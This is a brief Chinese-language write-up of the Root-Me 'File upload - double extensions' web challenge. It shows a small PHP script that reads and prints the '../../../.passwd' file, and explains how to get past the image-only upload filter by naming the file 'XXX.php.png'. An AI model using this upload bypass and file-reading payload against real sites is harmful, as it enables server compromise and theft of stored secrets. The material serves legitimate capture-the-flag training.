Root-Me [File upload - double extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-double-extensions)
===

看起來似一個 icon 的存放空間，但有上傳功能。  
並且題目有給予提示：
```
Your goal is to hack this photo galery by uploading PHP code.
Retrieve the validation password in the file .passwd at the root of the application.
```

## 解題關鍵
1. PHP 特性

## 解題方法
上傳功能有明文規定，僅能上傳 `.gif`、`.jpeg`、`.png` 三種格式，當然還是要挑戰一下，上傳個非規定的檔名，得到以下回復。  

```
Wrong file extension !
```

看來勢必如題目名稱所說的 `double extensions` 方法來進行解題，首先建構一個記事本，檔案內容如下：  

```php
<?php 
	$myfile = fopen("../../../.passwd", "r") or die("Unable to open file!");
	while(!feof($myfile)) {
		echo fgets($myfile) . "<br>";
	}
	fclose($myfile);	
?>
```

隨後存成 `XXX.php.png`，這邊要注意副檔名除了 `png` 之外，還需要加上 `php`，便會被 PHP 當作是程式碼執行。

## 授權聲明
[![copyright © 2019 By MksYi](https://img.shields.io/badge/copyright%20©-%202019%20By%20MksYi-blue.svg)](https://mks.tw/)
[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)